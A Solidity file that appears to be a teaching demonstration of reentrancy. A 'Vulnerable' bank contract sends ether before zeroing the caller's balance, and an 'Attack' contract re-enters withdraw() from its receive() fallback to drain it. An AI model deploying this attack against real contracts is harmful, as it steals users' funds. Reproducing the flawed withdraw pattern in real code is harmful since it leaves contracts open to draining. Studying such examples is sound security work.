// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vulnerable {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint amount = balances[msg.sender];
        require(amount > 0, "No balance");

        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");

        balances[msg.sender] = 0;
    }

    function getBalance() public view returns(uint) {
        return address(this).balance;
    }
}

contract Attack {
    Vulnerable public vulnerable;

    constructor(address _vulnerable) {
        vulnerable = Vulnerable(_vulnerable);
    }

    
    receive() external payable {
        if (address(vulnerable).balance >= 1 ether) {
            vulnerable.withdraw();
        }
    }

    
    function attack() public payable {
        require(msg.value >= 1 ether, "Send at least 1 ether");

        
        vulnerable.deposit{value: msg.value}();

        
        vulnerable.withdraw();
    }

    function getBalance() public view returns(uint) {
        return address(this).balance;
    }
}
